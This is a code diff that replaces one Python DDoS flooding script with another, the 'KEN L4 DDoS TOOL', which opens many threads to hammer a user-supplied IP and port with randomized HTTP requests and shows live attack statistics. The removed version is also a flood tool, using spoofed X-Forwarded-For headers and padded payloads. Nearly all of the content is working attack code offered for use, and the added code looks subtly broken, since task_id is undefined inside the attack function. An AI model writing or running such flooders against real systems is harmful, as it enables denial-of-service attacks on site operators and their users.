@@ -1,245 +1,162 @@
-#!/usr/bin/python3
-# -*- coding: utf-8 -*-
-import os
-import sys
 import socket
-import random
-import asyncio
-import resource
 import threading
+import random
 import time
-from datetime import datetime
+import signal
+import sys
 from rich.console import Console
 from rich.panel import Panel
 from rich.table import Table
 from rich.live import Live
+from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
 from rich.layout import Layout
-from rich.text import Text
+from datetime import datetime
 
 console = Console()
 running = True
-lock = threading.Lock()
-MAX_THREADS = 10000
-BATCH_SIZE = 250
-user_agents = []
 
-def optimize_system():
+def load_user_agents():
     try:
-        os.system("echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse")
-        resource.setrlimit(resource.RLIMIT_NOFILE, (999999, 999999))
-    except:
-        console.print("[yellow]⚠️ Couldn't optimize system limits[/]")
+        with open("useragent.txt", "r") as file:
+            return [line.strip() for line in file if line.strip()]
+    except FileNotFoundError:
+        console.print("[bold red]🚨 File useragent.txt nggak ketemu! Gas dulu generate pake useragentgenerator.py cuy! 💥[/]")
+        sys.exit(1)
 
-class AttackStats:
-    def __init__(self):
-        self.reset_stats()
-        
-    def reset_stats(self):
-        with lock:
-            self.current_rps = 0
-            self.current_mbps = 0
-            self.total_requests = 0
-            self.total_data_mb = 0
-    
-    def update(self, payload_size):
-        with lock:
-            self.current_rps += 1
-            self.current_mbps += (payload_size * 8) / 1_000_000
-            self.total_requests += 1
-            self.total_data_mb += payload_size / (1024 * 1024)
-    
-    def get_stats(self, reset=True):
-        with lock:
-            stats = {
-                'rps': self.current_rps,
-                'mbps': self.current_mbps,
-                'total': self.total_requests,
-                'data': self.total_data_mb
-            }
-            if reset:
-                self.current_rps = 0
-                self.current_mbps = 0
-            return stats
+user_agents = load_user_agents()
 
-stats = AttackStats()
+def generate_payload(ip):
+    method = random.choice(["GET", "POST", "HEAD", "PUT"])
+    path = random.choice(["/", "/index", "/home", "/api/data", "/random" + str(random.randint(1,999))])
+    ua = random.choice(user_agents)
+    headers = f"{method} {path} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {ua}\r\nConnection: Keep-Alive\r\n\r\n"
+    return headers.encode()
 
-def generate_payload(ip, size=1024):
-    method = random.choice(["GET", "POST", "HEAD", "PUT", "DELETE"])
-    path = f"/{random.randint(1,9999)}" if random.random() > 0.7 else random.choice([
-        "/", "/api", "/wp-admin", "/.env", "/graphql"
-    ])
-    
-    payload = (
-        f"{method} {path} HTTP/1.1\r\n"
-        f"Host: {ip}\r\n"
-        f"User-Agent: {random.choice(user_agents)}\r\n"
-        f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
-    )
-    
-    for _ in range(random.randint(2, 5)):
-        payload += f"X-Header-{random.randint(1000,9999)}: {random.getrandbits(32)}\r\n"
-    
-    current = len(payload.encode())
-    remaining = max(0, size - current - 4)
-    if remaining > 0:
-        payload += f"Padding: {'X'*remaining}\r\n"
-    
-    payload += "\r\n"
-    return payload.encode()
+rps_counter = 0
+mbps_counter = 0
+total_requests = 0
+total_data_mb = 0
+lock = threading.Lock()
 
-async def attack_task(ip, port, duration, size):
+def attack(ip, port, duration, progress):
+    global rps_counter, mbps_counter, total_requests, total_data_mb, running
     end_time = time.time() + duration
     while time.time() < end_time and running:
         try:
-            reader, writer = await asyncio.wait_for(
-                asyncio.open_connection(ip, port),
-                timeout=1.0
-            )
-            payload = generate_payload(ip, size)
-            writer.write(payload)
-            stats.update(len(payload))
-            await writer.drain()
-            writer.close()
-            await writer.wait_closed()
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(3)
+            s.connect((ip, port))
+            payload = generate_payload(ip)
+            s.send(payload)
+            with lock:
+                rps_counter += 1
+                mbps_counter += len(payload) / (1024 * 1024)
+                total_requests += 1
+                total_data_mb += len(payload) / (1024 * 1024)
+            s.close()
+            progress.advance(task_id)
         except:
             pass
 
-async def attack_manager(ip, port, duration, size, threads):
-    sem = asyncio.Semaphore(10000)  
-    
-    async def worker():
-        async with sem:
-            await attack_task(ip, port, duration, size)
-    
-    tasks = []
-    for _ in range(threads):
-        if not running:
-            break
-        task = asyncio.create_task(worker())
-        tasks.append(task)
-        await asyncio.sleep(0.001) 
-    
-    await asyncio.gather(*tasks)
-
-def create_layout():
+def create_layout(ip, port, threads, duration):
     layout = Layout()
-    layout.split(
-        Layout(name="header", size=3),
+    layout.split_column(
+        Layout(name="header", size=5),
         Layout(name="main", ratio=1),
         Layout(name="footer", size=3)
     )
     layout["main"].split_row(
-        Layout(name="stats"),
-        Layout(name="params")
+        Layout(name="stats", ratio=1),
+        Layout(name="details", ratio=1)
     )
     return layout
 
-def update_display(layout, ip, port, threads, duration, size, start_time):
-    current = stats.get_stats()
-    elapsed = time.time() - start_time
-    remaining = max(0, duration - elapsed)
-    
-    stats_table = Table(
-        title="[bold red]⚡ LIVE STATS[/]",
-        box=None,
-        show_header=False,
-        padding=(0, 2)
-    )
-    stats_table.add_column(style="bold cyan")
-    stats_table.add_column(style="bold green")
-    
-    stats_table.add_row("Requests/s", f"{current['rps']:,}")
-    stats_table.add_row("Throughput", f"{current['mbps']:.2f} Mbps")
-    stats_table.add_row("Total", f"{current['total']:,}")
-    stats_table.add_row("Data Sent", f"{current['data']:.2f} MB")
-    stats_table.add_row("Time Left", f"{int(remaining)}s")
-    
-    params_table = Table(
-        title="[bold yellow]💣 ATTACK PARAMS[/]",
-        box=None,
-        show_header=False,
-        padding=(0, 2)
-    )
-    params_table.add_column(style="bold cyan")
-    params_table.add_column(style="bold green")
-    
-    params_table.add_row("Target", f"{ip}:{port}")
-    params_table.add_row("Threads", f"{threads:,}")
-    params_table.add_row("Payload", f"{size} bytes")
-    params_table.add_row("Duration", f"{duration}s")
+def update_display(ip, port, threads, duration, start_time, progress):
+    global rps_counter, mbps_counter, total_requests, total_data_mb
+    layout = create_layout(ip, port, threads, duration)
     
     layout["header"].update(
-        Panel.fit(
-            "[blink red] WAKKK MODE: FULL SENDSKY ULTIMATE [/]",
-            border_style="bright_red"
+        Panel(
+            f"                              [bold magenta]⚡ KEN L4 DDoS TOOL - FULL POWER ⚡[/]\n                                  [green]By Ken - Underground Edition[/]",
+            border_style="red",
+            title="KENSPLOIT"
         )
     )
+    
+    stats_table = Table(title="🔥 Real-Time Attack Stats 🔥", border_style="cyan")
+    stats_table.add_column("Metric", style="bold yellow")
+    stats_table.add_column("Value", style="bold green")
+    stats_table.add_row("RPS", f"{rps_counter}")
+    stats_table.add_row("Mbps", f"{mbps_counter:.2f}")
+    stats_table.add_row("Total Requests", f"{total_requests}")
+    stats_table.add_row("Total Data Sent (MB)", f"{total_data_mb:.2f}")
     layout["stats"].update(stats_table)
-    layout["params"].update(params_table)
-    layout["footer"].update(
-        Panel.fit(
-            f"[bold yellow]Attacking since {datetime.fromtimestamp(start_time).strftime('%H:%M:%S')}[/]",
-            border_style="bright_blue"
-        )
-    )
+    
+    details_table = Table(title="💥 Attack Details 💥", border_style="magenta")
+    details_table.add_column("Parameter", style="bold yellow")
+    details_table.add_column("Value", style="bold green")
+    details_table.add_row("Target IP", ip)
+    details_table.add_row("Target Port", str(port))
+    details_table.add_row("Threads", str(threads))
+    details_table.add_row("Duration", f"{duration} seconds")
+    details_table.add_row("Start Time", datetime.fromtimestamp(start_time).strftime('%Y-%m-%d %H:%M:%S'))
+    layout["details"].update(details_table)
+    
+    layout["footer"].update(progress)
     
     return layout
 
-async def main_async():
-    optimize_system()
-    
-    global user_agents
-    try:
-        with open("useragents.txt") as f:
-            user_agents = [line.strip() for line in f if line.strip()]
-    except:
-        user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-
-        ]
-    
-    console.print(Panel.fit(
-        "[bold red]WAKKK MODE ACTIVATED[/]",
-        subtitle="[yellow]Nuclear DDoS Tool[/]",
-        border_style="bright_red"
-    ))
-    
-    ip = console.input("[bold cyan]>> Target IP: [/]")
-    port = int(console.input("[bold cyan]>> Target Port: [/]"))
-    threads = min(int(console.input(f"[bold cyan]>> Threads (1-{MAX_THREADS}): [/]")), MAX_THREADS)
-    duration = int(console.input("[bold cyan]>> Duration (sec): [/]"))
-    size = int(console.input("[bold cyan]>> Payload Size (bytes): [/]"))
-    
-    layout = create_layout()
+def stats(ip, port, threads, duration, progress):
+    global rps_counter, mbps_counter, running
     start_time = time.time()
-    
-    with Live(layout, refresh_per_second=10, screen=True) as live:
-        manager = asyncio.create_task(
-            attack_manager(ip, port, duration, size, threads)
-        )
-        
-        while running and (time.time() - start_time) < duration:
-            live.update(update_display(
-                layout, ip, port, threads, duration, size, start_time
-            ))
-            await asyncio.sleep(0.1)
-        
-        await manager
+    with Live(update_display(ip, port, threads, duration, start_time, progress), refresh_per_second=4, console=console):
+        while running:
+            time.sleep(1)
+            with lock:
+                rps_counter = 0
+                mbps_counter = 0
+
+def handle_exit(sig, frame):
+    global running
+    running = False
+    console.print(Panel.fit("[bold red]🛑 SERANGAN DIHENTIKAN MANUAL ‼️[/]", border_style="bold yellow"))
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, handle_exit)
+signal.signal(signal.SIGTSTP, handle_exit)
 
 def main():
-    try:
-        asyncio.run(main_async())
-    except KeyboardInterrupt:
-        console.print("\n[bold red]🚨 ATTACK STOPPED![/]")
-    finally:
-        final = stats.get_stats(False)
-        console.print(Panel.fit(
-            f"[bold green]💥 ATTACK SUMMARY[/]\n"
-            f"Total Requests: [bold]{final['total']:,}[/]\n"
-            f"Data Sent: [bold]{final['data']:.2f} MB[/]\n"
-            f"Peak RPS: [bold]{final['rps']:,}[/]",
-            border_style="bright_green"
-        ))
+    console.clear()
+    console.print(Panel.fit("  ⚡ [bold magenta]KEN L4 DDoS TOOL - POWERFULL[/] ⚡  \n     [green]By Ken - Underground Edition[/]\n", border_style="red"))
+
+    ip = console.input("[bold yellow]🌐 Target IP: [/]")
+    port = int(console.input("[bold yellow]📡 Port: [/]"))
+    threads = int(console.input("[bold yellow]⚙️ Jumlah Thread: [/]"))
+    duration = int(console.input("[bold yellow]⏱️ Durasi (detik): [/]"))
+
+    progress = Progress(
+        TextColumn("[bold cyan]{task.description}"),
+        BarColumn(),
+        "[progress.percentage]{task.percentage:>3.0f}%",
+        TimeRemainingColumn(),
+        console=console
+    )
+    task_id = progress.add_task("[cyan]🔥 Blasting Threads...", total=threads)
+
+    console.print(f"\n[bold green]🚀 GASKEUN KE {ip}:{port} Pake {threads} Thread Selama {duration} Detik!![/]\n")
+
+    threading.Thread(target=stats, args=(ip, port, threads, duration, progress), daemon=True).start()
+
+    for _ in range(threads):
+        thread = threading.Thread(target=attack, args=(ip, port, duration, progress))
+        thread.daemon = True
+        thread.start()
+
+    start = time.time()
+    while running and (time.time() - start) < duration:
+        time.sleep(1)
+
+    console.print(Panel.fit("[bold red]🔥 SERANGAN SELESAI ‼️🔥[/]", border_style="bold green"))
 
 if __name__ == "__main__":
     main()
